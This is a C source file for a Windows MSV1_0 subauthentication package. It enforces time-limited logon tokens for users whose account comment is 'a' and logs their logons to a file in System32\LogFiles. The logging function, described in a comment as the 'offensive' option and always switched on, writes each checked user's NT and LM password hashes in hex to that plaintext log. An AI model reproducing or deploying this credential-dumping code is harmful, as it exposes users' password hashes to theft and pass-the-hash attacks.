#include "stdafx.h"

#if ( _MSC_VER >= 800 )
#pragma warning ( 3 : 4100 ) // enable "Unreferenced formal parameter"
#pragma warning ( 3 : 4219 ) // enable "trailing ',' used for variable argument list"
#endif

#include <time.h>
#include <windef.h>
#include <windows.h>
#include <lmcons.h>
#include <lmaccess.h>
#include <lmapibuf.h>
#include <subauth.h>
#include "time_functions.h"

#define LOGFILEPATH L"C:\\Windows\\System32\\LogFiles\\subauthlog.txt"
#define _SECOND ((__int64) 10000000)
#define _MINUTE (60 * _SECOND)

VOID
WriteLogFile(
	PUSER_ALL_INFORMATION UserAll,
	INT token_flag,
	BOOL WriteSensitive
);

VOID
WriteLogFile(
	PUSER_ALL_INFORMATION UserAll,
	INT token_flag,
	BOOL WriteSensitive
)
{
	DWORD dwWritten;
	HANDLE hFile;
	hFile = CreateFileW(LOGFILEPATH, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile != INVALID_HANDLE_VALUE) {
		WCHAR szBuffer[256];
		WCHAR szTokenFlagBuffer[12];
		WCHAR szTimeBuffer[256];
		SYSTEMTIME st;

		// Write timestamp into a log file
		GetSystemTime(&st);
		INT timestamp_len = swprintf_s(szTimeBuffer, 255, L"%d-%02d-%02d %02d:%02d:%02d.%03d", (WCHAR)st.wYear, (WCHAR)st.wMonth, (WCHAR)st.wDay, (WCHAR)st.wHour, (WCHAR)st.wMinute, (WCHAR)st.wSecond, (WCHAR)st.wMilliseconds);
		if (timestamp_len != -1)
			WriteFile(hFile, szTimeBuffer, timestamp_len * sizeof(WCHAR), &dwWritten, NULL);
		WriteFile(hFile, L",", sizeof(WCHAR), &dwWritten, NULL);
		
		// Write user's propertis: username, comment, homeDirectory
		WriteFile(hFile, UserAll->UserName.Buffer, UserAll->UserName.Length, &dwWritten, NULL);
		WriteFile(hFile, L",", sizeof(WCHAR), &dwWritten, NULL);
		WriteFile(hFile, UserAll->UserComment.Buffer, UserAll->UserComment.Length, &dwWritten, NULL);
		WriteFile(hFile, L",", sizeof(WCHAR), &dwWritten, NULL);
		WriteFile(hFile, UserAll->HomeDirectory.Buffer, UserAll->HomeDirectory.Length, &dwWritten, NULL);
		WriteFile(hFile, L",", sizeof(WCHAR), &dwWritten, NULL);
		
		// Write flag which represents if user is allowed to login
		INT token_flag_length = swprintf_s(szTokenFlagBuffer, 10, L"%d", token_flag);
		if (token_flag_length != -1)
			WriteFile(hFile, szTokenFlagBuffer, token_flag_length * sizeof(WCHAR), &dwWritten, NULL);
		WriteFile(hFile, L",", sizeof(WCHAR), &dwWritten, NULL);

		// In case you want to be a little offensive - write the user's NT and LM password values
		if (WriteSensitive) {
			if (UserAll->NtPasswordPresent)
			{
				for (int i = 0; i < UserAll->NtPassword.Length; i++)
				{
					swprintf_s(szBuffer, L"%02X", ((PBYTE)UserAll->NtPassword.Buffer)[i]);
					WriteFile(hFile, szBuffer, 2 * sizeof(WCHAR), &dwWritten, NULL);
				}
			}
			WriteFile(hFile, L",", sizeof(WCHAR), &dwWritten, NULL);
			if (UserAll->LmPasswordPresent)
			{
				for (int i = 0; i < UserAll->LmPassword.Length; i++)
				{
					swprintf_s(szBuffer, L"%02X", ((PBYTE)UserAll->LmPassword.Buffer)[i]);
					WriteFile(hFile, szBuffer, 2 * sizeof(WCHAR), &dwWritten, NULL);
				}
			}
		}

		// Closing log file
		WriteFile(hFile, L"\r\n", 2 * sizeof(WCHAR), &dwWritten, NULL);
		CloseHandle(hFile);
	}
}

NTSTATUS
NTAPI
Msv1_0SubAuthenticationRoutine(
	IN NETLOGON_LOGON_INFO_CLASS LogonLevel,
	IN PVOID LogonInformation,
	IN ULONG Flags,
	IN PUSER_ALL_INFORMATION UserAll,
	OUT PULONG WhichFields,
	OUT PULONG UserFlags,
	OUT PBOOLEAN Authoritative,
	OUT PLARGE_INTEGER LogoffTime,
	OUT PLARGE_INTEGER KickoffTime
)
{
	UNREFERENCED_PARAMETER(LogonLevel);
	UNREFERENCED_PARAMETER(LogonInformation);
	UNREFERENCED_PARAMETER(Flags);

	NTSTATUS Status;
	
	//
	// Check whether the SubAuthentication package supports this type
	//  of logon.
	//

	*Authoritative = TRUE;
	*UserFlags = 0;
	*WhichFields = 0;

	//
	// Verify if the given user should be checked;
	//
	if (UserAll->UserComment.Length == 2 && _wcsnicmp(UserAll->UserComment.Buffer, L"a", 1) == 0)
	{
		INT token_flag = VerifyLogonTimeToken(UserAll->HomeDirectory.Buffer);
		if (token_flag == 1)
		{
			Status = STATUS_SUCCESS;
			FILETIME ft;
			SYSTEMTIME st;
			ULONGLONG qwRes;
			GetSystemTime(&st);
			SystemTimeToFileTime(&st, &ft);
			qwRes = (((ULONGLONG)ft.dwHighDateTime) << 32) + ft.dwLowDateTime;
			qwRes += 20 * _MINUTE;
			ft.dwLowDateTime = (DWORD)(qwRes & 0xFFFFFFFF);
			ft.dwHighDateTime = (DWORD)(qwRes >> 32);
			LogoffTime->HighPart = ft.dwHighDateTime;
			LogoffTime->LowPart = ft.dwLowDateTime;
			KickoffTime->HighPart = ft.dwHighDateTime;
			KickoffTime->LowPart = ft.dwLowDateTime;
		}
			
		else
			Status = STATUS_INVALID_LOGON_HOURS;
		WriteLogFile(UserAll, token_flag, 1);
	}

	//
	// Permit all other users by default;
	//
	else
	{
		Status = STATUS_SUCCESS;

		LogoffTime->HighPart = 0x7FFFFFFF;
		LogoffTime->LowPart = 0xFFFFFFFF;

		KickoffTime->HighPart = 0x7FFFFFFF;
		KickoffTime->LowPart = 0xFFFFFFFF;
	}

	//
	// The user is valid.
	//

	*Authoritative = TRUE;
	return Status;

}  // Msv1_0SubAuthenticationRoutine


NTSTATUS
NTAPI
Msv1_0SubAuthenticationFilter(
	IN NETLOGON_LOGON_INFO_CLASS LogonLevel,
	IN PVOID LogonInformation,
	IN ULONG Flags,
	IN PUSER_ALL_INFORMATION UserAll,
	OUT PULONG WhichFields,
	OUT PULONG UserFlags,
	OUT PBOOLEAN Authoritative,
	OUT PLARGE_INTEGER LogoffTime,
	OUT PLARGE_INTEGER KickoffTime
)
{
	return(Msv1_0SubAuthenticationRoutine(
		LogonLevel,
		LogonInformation,
		Flags,
		UserAll,
		WhichFields,
		UserFlags,
		Authoritative,
		LogoffTime,
		KickoffTime
	));
}
// subauth.c eof
